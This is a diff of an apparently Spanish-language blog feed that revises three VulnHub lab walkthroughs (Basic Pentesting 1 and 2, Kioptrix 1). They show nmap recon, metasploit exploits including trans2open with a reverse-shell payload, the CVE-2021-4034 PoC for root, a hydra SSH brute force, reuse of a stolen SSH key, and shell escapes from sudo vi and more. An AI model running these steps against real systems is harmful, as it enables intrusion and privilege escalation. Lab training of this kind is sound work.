@@ -253,16 +253,15 @@ Puedes ver todos los contenedores que tienes en tu ordenador utilizando el sigui
 		  &lt;p&gt;Puedes descargar la máquina vulnerable desde &lt;a href=&quot;https://www.vulnhub.com/entry/basic-pentesting-1,216/&quot;&gt;Vulnhub&lt;/a&gt;&lt;/p&gt;
 &lt;h2 id=&quot;descubrimiento-de-host&quot;&gt;Descubrimiento de host &lt;a class=&quot;direct-link&quot; href=&quot;#descubrimiento-de-host&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
 &lt;p&gt;Usamos &lt;code&gt;sudo netdiscover&lt;/code&gt; para descubrir los host en la red.&lt;/p&gt;
-&lt;pre class=&quot;language-plaintext&quot;&gt;&lt;code class=&quot;language-plaintext&quot;&gt;Ubuntu:   192.168.0.20&lt;br&gt;Kali:     192.168.0.16&lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&quot;descubriendo-servicios-y-versiones&quot;&gt;Descubriendo servicios y versiones &lt;a class=&quot;direct-link&quot; href=&quot;#descubriendo-servicios-y-versiones&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-&lt;p&gt;Debemos identificar puertos, servicios y versiones de los mismos.&lt;/p&gt;
-&lt;p&gt;Usamos &lt;code&gt;nmap -sT -p- -A 192.168.0.26 -oA resultados&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;En los resultados encontramos algo de interés:&lt;/p&gt;
+&lt;p&gt;Estas son las dos máquinas del laboratorio:&lt;/p&gt;
+&lt;pre class=&quot;language-plaintext&quot;&gt;&lt;code class=&quot;language-plaintext&quot;&gt;Kali:    192.168.0.16&lt;br&gt;Victima: 192.168.0.26&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;reconocimiento&quot;&gt;Reconocimiento &lt;a class=&quot;direct-link&quot; href=&quot;#reconocimiento&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Usamos &lt;code&gt;nmap -sT -p- -A 192.168.0.26 -oA resultados&lt;/code&gt; para realizar un escaneo completo de puertos y servicios.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;PORT   STATE SERVICE REASON  VERSION
 21/tcp open  ftp     syn-ack ProFTPD 1.3.3c
 22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&quot;explotando-la-maquina&quot;&gt;Explotando la maquina &lt;a class=&quot;direct-link&quot; href=&quot;#explotando-la-maquina&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;h2 id=&quot;explotaci%C3%B3n&quot;&gt;Explotación &lt;a class=&quot;direct-link&quot; href=&quot;#explotaci%C3%B3n&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
 &lt;h3 id=&quot;buscar-exploit&quot;&gt;Buscar exploit &lt;a class=&quot;direct-link&quot; href=&quot;#buscar-exploit&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
 &lt;p&gt;Vamos a probar a romper &lt;code&gt;FTPd&lt;/code&gt; con &lt;code&gt;metasploit&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;Podemos lanzar metasploit con &lt;code&gt;msfconsole&lt;/code&gt;&lt;/p&gt;
@@ -279,7 +278,7 @@ Puedes ver todos los contenedores que tienes en tu ordenador utilizando el sigui
 &lt;p&gt;Podemos crear un usuario con &lt;code&gt;useradd hhyyppeerr&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;Y crear una contraseña con &lt;code&gt;echo &amp;quot;hhyyppeerr:ilovesummer&amp;quot; | chpasswd&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;Podemos comprobar que podemos entrar al sistema con &lt;code&gt;ssh hhyyppeerr@192.168.0.26&lt;/code&gt; e introduciendo &lt;code&gt;ilovesummer&lt;/code&gt; como contraseña.&lt;/p&gt;
-&lt;h2 id=&quot;weaponization-y-escalado-de-privilegios&quot;&gt;Weaponization y escalado de privilegios &lt;a class=&quot;direct-link&quot; href=&quot;#weaponization-y-escalado-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;h2 id=&quot;escalado-de-privilegios&quot;&gt;Escalado de privilegios &lt;a class=&quot;direct-link&quot; href=&quot;#escalado-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
 &lt;p&gt;Copiamos &lt;code&gt;linpeas&lt;/code&gt; o el script que queramos usar a la maquina objetivo con &lt;code&gt;scp ./linpeas.sh hhyyppeerr@192.168.0.26:/tmp/linpeas.sh&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;Entramos de nuevo en la maquina objetivo con nuestro usuario y lanzamos el script.&lt;/p&gt;
 &lt;p&gt;Linpeas nos ha mostrado el siguiente exploit disponible:&lt;/p&gt;
@@ -296,7 +295,6 @@ Puedes ver todos los contenedores que tienes en tu ordenador utilizando el sigui
 &lt;p&gt;Nos copiamos el repositorio a la maquina objetivo con &lt;code&gt;nano&lt;/code&gt; o &lt;code&gt;scp&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;Compilamos y ejecutamos el codigo:&lt;/p&gt;
 &lt;pre class=&quot;language-plaintext&quot;&gt;&lt;code class=&quot;language-plaintext&quot;&gt;$ ls&lt;br&gt;cve-2021-4034-poc.c  README.md&lt;br&gt;$ gcc cve-2021-4034-poc.c -o cve-2021-4034-poc&lt;br&gt;$ ls&lt;br&gt;cve-2021-4034-poc  cve-2021-4034-poc.c  README.md&lt;br&gt;$ ./cve-2021-4034-poc&lt;br&gt;# whoami&lt;br&gt;root&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Puede que esto no funcione, pero con &lt;code&gt;make&lt;/code&gt; si.&lt;/p&gt;
 
 			
 		</content>
@@ -310,20 +308,22 @@ Puedes ver todos los contenedores que tienes en tu ordenador utilizando el sigui
 		<content type="html">
 		  &lt;p&gt;Puedes descargar la máquina vulnerable desde &lt;a href=&quot;https://www.vulnhub.com/entry/basic-pentesting-2,241/&quot;&gt;vulnhub&lt;/a&gt;&lt;/p&gt;
 &lt;h2 id=&quot;descubrimiento-de-hosts&quot;&gt;Descubrimiento de hosts &lt;a class=&quot;direct-link&quot; href=&quot;#descubrimiento-de-hosts&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-&lt;p&gt;Tras iniciar la maquina escaneamos con &lt;code&gt;sudo netdiscover&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;Estos son las IP del lab:&lt;/p&gt;
-&lt;pre class=&quot;language-plaintext&quot;&gt;&lt;code class=&quot;language-plaintext&quot;&gt;Ubuntu(host): 192.168.0.20&lt;br&gt;Kali(VM):     192.168.0.16&lt;br&gt;Victima:      192.168.0.17&lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&quot;servicios&quot;&gt;Servicios &lt;a class=&quot;direct-link&quot; href=&quot;#servicios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Usamos &lt;code&gt;sudo netdiscover&lt;/code&gt; para descubrir los host en la red.&lt;/p&gt;
+&lt;p&gt;Estas son las dos máquinas del laboratorio:&lt;/p&gt;
+&lt;pre class=&quot;language-plaintext&quot;&gt;&lt;code class=&quot;language-plaintext&quot;&gt;Kali(VM):     192.168.0.16&lt;br&gt;Victima:      192.168.0.17&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;reconocimiento&quot;&gt;Reconocimiento &lt;a class=&quot;direct-link&quot; href=&quot;#reconocimiento&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;El escaneo de servicios nos arroja el siguiente resultado:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;22/tcp  open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
 80/tcp  open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
 139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 445/tcp open  netbios-ssn syn-ack Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Si lanzamos &lt;code&gt;nmap -sT -sV -A -vvv 192.168.0.17&lt;/code&gt; y no obtenemos ninguna vulnerabilidad explotable.&lt;/p&gt;
+&lt;p&gt;Si lanzamos &lt;code&gt;nmap -sT -sV -A -vvv 192.168.0.17&lt;/code&gt; no obtenemos ninguna vulnerabilidad explotable.&lt;/p&gt;
 &lt;p&gt;Sin embargo, podemos intentar enumerar usuarios de samba con &lt;code&gt;enum4linux &amp;lt;ip&amp;gt;&lt;/code&gt;&lt;br&gt;
 Obtenemos dos usuarios:&lt;/p&gt;
 &lt;pre class=&quot;language-plaintext&quot;&gt;&lt;code class=&quot;language-plaintext&quot;&gt;kay&lt;br&gt;jan&lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&quot;ataque-ssh&quot;&gt;Ataque SSH &lt;a class=&quot;direct-link&quot; href=&quot;#ataque-ssh&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;h2 id=&quot;explotaci%C3%B3n&quot;&gt;Explotación &lt;a class=&quot;direct-link&quot; href=&quot;#explotaci%C3%B3n&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;h3 id=&quot;ssh&quot;&gt;SSH &lt;a class=&quot;direct-link&quot; href=&quot;#ssh&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
 &lt;p&gt;Lanzamos hydra con rockyou.txt usando &lt;code&gt;hydra -l kay -P ./rockyou.txt ssh://192.168.0.17&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;La contraseña es &lt;code&gt;armando&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;Una vez dentro podemos hacer &lt;code&gt;ls -lisaR /home&lt;/code&gt; para analizar las carpetas de usuarios.&lt;/p&gt;
@@ -337,7 +337,7 @@ total 20
 798918 4 -rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub
 jan@basic2:~$ cat /home/kay/.ssh/id_rsa
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&quot;usando-una-clave-robada&quot;&gt;Usando una clave robada &lt;a class=&quot;direct-link&quot; href=&quot;#usando-una-clave-robada&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;h3 id=&quot;usando-una-clave-robada&quot;&gt;Usando una clave robada &lt;a class=&quot;direct-link&quot; href=&quot;#usando-una-clave-robada&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
 &lt;p&gt;Podemos copiar el archivo y usarlo para intentar entrar en la maquina con &lt;code&gt;ssh kay@ip -i clave-robada&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;Whooops! Nos devuelve esto:&lt;/p&gt;
 &lt;pre class=&quot;language-plaintext&quot;&gt;&lt;code class=&quot;language-plaintext&quot;&gt;Permissions 0664 for &#39;id_key&#39; are too open.&lt;br&gt;It is required that your private key files are NOT accessible by others.&lt;br&gt;This private key will be ignored.&lt;br&gt;Load key &quot;id_key&quot;: bad permissions&lt;/code&gt;&lt;/pre&gt;
@@ -351,7 +351,7 @@ jan@basic2:~$ cat /home/kay/.ssh/id_rsa
 &lt;p&gt;Nos pedirá la contraseña &lt;code&gt;beeswax&lt;/code&gt; descubierta antes.&lt;/p&gt;
 &lt;p&gt;Estamos dentro!&lt;/p&gt;
 &lt;p&gt;¿Que podemos hacer ahora?&lt;/p&gt;
-&lt;h2 id=&quot;escalando-privilegios&quot;&gt;Escalando privilegios &lt;a class=&quot;direct-link&quot; href=&quot;#escalando-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;h3 id=&quot;escalando-privilegios&quot;&gt;Escalando privilegios &lt;a class=&quot;direct-link&quot; href=&quot;#escalando-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
 &lt;p&gt;Podemos volver a usar &lt;code&gt;ls -lisaR /home&lt;/code&gt; para listar de nuevo por si hubiera cosas que no hemos visto antes&lt;/p&gt;
 &lt;p&gt;Tenemos un &lt;code&gt;pass.bak&lt;/code&gt; que podemos leer:&lt;/p&gt;
 &lt;pre class=&quot;language-plaintext&quot;&gt;&lt;code class=&quot;language-plaintext&quot;&gt;heresareallystrongpasswordthatfollowsthepasswordpolicy$$&lt;/code&gt;&lt;/pre&gt;
@@ -359,10 +359,10 @@ jan@basic2:~$ cat /home/kay/.ssh/id_rsa
 &lt;p&gt;Podemos pasar esa contraseña y ver que podemos lanzar &lt;code&gt;sudo su&lt;/code&gt;&lt;/p&gt;
 &lt;pre class=&quot;language-plaintext&quot;&gt;&lt;code class=&quot;language-plaintext&quot;&gt;[sudo] password for kay: &lt;br&gt;Matching Defaults entries for kay on basic2:&lt;br&gt;    env_reset, mail_badpass,&lt;br&gt;    secure_path=/usr/local/sbin&#92;:/usr/local/bin&#92;:/usr/sbin&#92;:/usr/bin&#92;:/sbin&#92;:/bin&#92;:/snap/bin&lt;br&gt;&lt;br&gt;User kay may run the following commands on basic2:&lt;br&gt;    (ALL : ALL) ALL&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Tras lanzarlo, ya somos &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
-&lt;h3 id=&quot;otras-formas-de-conseguir-root%3A&quot;&gt;Otras formas de conseguir &lt;code&gt;root&lt;/code&gt;: &lt;a class=&quot;direct-link&quot; href=&quot;#otras-formas-de-conseguir-root%3A&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
-&lt;h4 id=&quot;sudo-vi&quot;&gt;sudo vi &lt;a class=&quot;direct-link&quot; href=&quot;#sudo-vi&quot;&gt;#&lt;/a&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;otras-formas-de-conseguir-root%3A&quot;&gt;Otras formas de conseguir &lt;code&gt;root&lt;/code&gt;: &lt;a class=&quot;direct-link&quot; href=&quot;#otras-formas-de-conseguir-root%3A&quot;&gt;#&lt;/a&gt;&lt;/h4&gt;
+&lt;h5 id=&quot;sudo-vi&quot;&gt;sudo vi &lt;a class=&quot;direct-link&quot; href=&quot;#sudo-vi&quot;&gt;#&lt;/a&gt;&lt;/h5&gt;
 &lt;pre class=&quot;language-plaintext&quot;&gt;&lt;code class=&quot;language-plaintext&quot;&gt;sudo vi&lt;br&gt;Escribimos :!sh y nos devuelve una consola root&lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id=&quot;more&quot;&gt;more &lt;a class=&quot;direct-link&quot; href=&quot;#more&quot;&gt;#&lt;/a&gt;&lt;/h4&gt;
+&lt;h5 id=&quot;more&quot;&gt;more &lt;a class=&quot;direct-link&quot; href=&quot;#more&quot;&gt;#&lt;/a&gt;&lt;/h5&gt;
 &lt;pre class=&quot;language-plaintext&quot;&gt;&lt;code class=&quot;language-plaintext&quot;&gt;Escribimos un archivo relativamente largo y lo abrimos con `more` y tenemos algo similar a vi&lt;br&gt;Con !sh podremos abrir otra consola.&lt;/code&gt;&lt;/pre&gt;
 
 			
@@ -377,31 +377,10 @@ jan@basic2:~$ cat /home/kay/.ssh/id_rsa
 		<content type="html">
 		  &lt;p&gt;Puedes descargar la máquina vulnerable desde &lt;a href=&quot;https://www.vulnhub.com/entry/kioptrix-level-1-1,22/&quot;&gt;vulnhub&lt;/a&gt;&lt;/p&gt;
 &lt;h2 id=&quot;descubrimiento-de-hosts&quot;&gt;Descubrimiento de hosts &lt;a class=&quot;direct-link&quot; href=&quot;#descubrimiento-de-hosts&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-&lt;ol&gt;
-&lt;li&gt;Escaneamos para descubrir hosts:&lt;br&gt;
-nmap -sn &lt;ip&gt;/&lt;rango&gt;&lt;/rango&gt;&lt;/ip&gt;&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;Nos da el siguiente resultado:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-10 09:23 CEST
-Nmap scan report for www.adsl.vf (192.168.0.1)
-Host is up (0.0048s latency).
-Nmap scan report for 192.168.0.10
-Host is up (0.082s latency).
-Nmap scan report for 192.168.0.16
-Host is up (0.00044s latency).
-Nmap scan report for 192.168.0.20
-Host is up (0.000081s latency).
-Nmap scan report for 192.168.0.24
-Host is up (0.00041s latency).
-Nmap done: 256 IP addresses (5 hosts up) scanned in 15.31 seconds
-&lt;/code&gt;&lt;/pre&gt;
-&lt;ol start=&quot;2&quot;&gt;
-&lt;li&gt;Escaneamos versiones&lt;br&gt;
-nmap -sV &lt;ip&gt;&lt;/ip&gt;&lt;/li&gt;
-&lt;/ol&gt;
-&lt;pre&gt;&lt;code&gt; ~ nmap -sV 192.168.0.24
-Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-10 09:26 CEST
-Nmap scan report for 192.168.0.24
+&lt;p&gt;Escaneamos con &lt;code&gt;nmap -sn &amp;lt;ip&amp;gt;/&amp;lt;rango&amp;gt;&lt;/code&gt;, encontramos la maquina en la ip &lt;code&gt;192.168.0.24&lt;/code&gt;.&lt;/p&gt;
+&lt;h2 id=&quot;reconocimiento&quot;&gt;Reconocimiento &lt;a class=&quot;direct-link&quot; href=&quot;#reconocimiento&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Escaneamos con &lt;code&gt;nmap -sV 192.168.0.24&lt;/code&gt; para realizar una enumeración de puertos y servicios.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Nmap scan report for 192.168.0.24
 Host is up (0.0021s latency).
 Not shown: 994 closed ports
 PORT      STATE SERVICE     VERSION
@@ -412,21 +391,13 @@ PORT      STATE SERVICE     VERSION
 443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
 32768/tcp open  status      1 (RPC #100024)
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Vemos que 192.168.0.24 es un redhat con varios puertos abiertos.&lt;/p&gt;
-&lt;p&gt;Nos interesa el servicio de Samba, pero necesitamos conocer su version antes de atacar.&lt;/p&gt;
+&lt;p&gt;Vemos que 192.168.0.24 es un &lt;strong&gt;redhat&lt;/strong&gt; con varios puertos abiertos.&lt;/p&gt;
+&lt;p&gt;Nos interesa el servicio de &lt;strong&gt;Samba&lt;/strong&gt;, pero necesitamos conocer su version antes.&lt;/p&gt;
+&lt;h2 id=&quot;explotaci%C3%B3n&quot;&gt;Explotación &lt;a class=&quot;direct-link&quot; href=&quot;#explotaci%C3%B3n&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
 &lt;p&gt;Con metasploit podemos ejecutar el siguiente scanner:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;msfconsole
-search /scanner/smb/ #para buscar
-use /auxiliary/scanner/smb/smb_version
-show options
-set rhosts 192.168.0.24
-&lt;/code&gt;&lt;/pre&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;msfconsole&lt;br&gt;search /scanner/smb/ &lt;span class=&quot;token comment&quot;&gt;#para buscar&lt;/span&gt;&lt;br&gt;use /auxiliary/scanner/smb/smb_version&lt;br&gt;show options&lt;br&gt;&lt;span class=&quot;token builtin class-name&quot;&gt;set&lt;/span&gt; rhosts &lt;span class=&quot;token number&quot;&gt;192.168&lt;/span&gt;.0.24&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Al lanzarlo, obtenemos lo siguiente:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;[*] 192.168.0.24:139      - SMB Detected (versions:) (preferred dialect:) (signatures:optional)
-[*] 192.168.0.24:139      -   Host could not be identified: Unix (Samba 2.2.1a)
-[*] 192.168.0.24:         - Scanned 1 of 1 hosts (100% complete)
-[*] Auxiliary module execution completed
-&lt;/code&gt;&lt;/pre&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;*&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;192.168&lt;/span&gt;.0.24:139      - SMB Detected &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;versions:&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;preferred dialect:&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;signatures:optional&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;*&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;192.168&lt;/span&gt;.0.24:139      -   Host could not be identified: Unix &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;Samba &lt;span class=&quot;token number&quot;&gt;2.2&lt;/span&gt;.1a&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;*&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;192.168&lt;/span&gt;.0.24:         - Scanned &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; of &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; hosts &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;% complete&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;*&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; Auxiliary module execution completed&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Una vez tenemos la version, podemos buscar si existen exploits con &lt;code&gt;searchsploit &amp;lt;servicio&amp;gt;&lt;/code&gt; y &lt;code&gt;searchsplot &amp;lt;servicio&amp;gt; &amp;lt;version&amp;gt;&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;Con searchsploit samba 2.2.1a nos da el siguiente resultado:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;------------------------------- ---------------------------------
@@ -442,7 +413,7 @@ Shellcodes: No Results
 &lt;p&gt;Para explotar la vulnerabilidad debemos encontrar una en su version.&lt;/p&gt;
 &lt;p&gt;En concreto, aqui tenemos la vulnerabilidad trans2open, podemos buscarla con &lt;code&gt;search trans2open&lt;/code&gt; en metasploit.&lt;/p&gt;
 &lt;p&gt;Debemos configurar el payload con &lt;code&gt;set payload linux/x86/shell_reverse_tcp&lt;/code&gt; y el rhosts.&lt;/p&gt;
-&lt;p&gt;Al lanzarlo con run obtenemos una shell con usuario root.&lt;/p&gt;
+&lt;p&gt;Al lanzarlo con run obtenemos una shell con usuario &lt;strong&gt;root&lt;/strong&gt;.&lt;/p&gt;
 
 			
 		</content>
